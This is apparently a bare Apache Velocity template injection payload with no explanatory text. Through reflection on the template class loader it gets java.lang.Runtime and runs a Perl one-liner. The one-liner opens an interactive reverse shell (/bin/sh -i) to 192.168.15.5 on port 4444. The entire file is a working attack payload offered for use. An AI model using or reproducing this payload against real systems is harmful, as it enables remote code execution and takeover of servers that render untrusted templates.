

#set($startClassLoader = "")
#set($appClassLoader=$startClassLoader.getClass().forName("org.apache.velocity.Template").getClassLoader())

#set($runTimeClass = $appClassLoader.loadClass("java.lang.Runtime"))
#set($runtimeMethod = $runTimeClass.getDeclaredMethod("getRuntime", null))
#set($runtimeObject = $runtimeMethod.invoke($runTimeClass, null))

#set($cmdString = "/bin/sh:-c:perl -e 'use Socket;$i=""192.168.15.5"";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'")
#set($cmdStringArray = $cmdString.split(":"))
#set($execMethod=$runtimeObject.getClass().getDeclaredMethod("exec",$cmdStringArray.getClass()))

#set( $objectArray = [$cmdStringArray] )
$execMethod.invoke($runtimeObject,$objectArray.toArray());
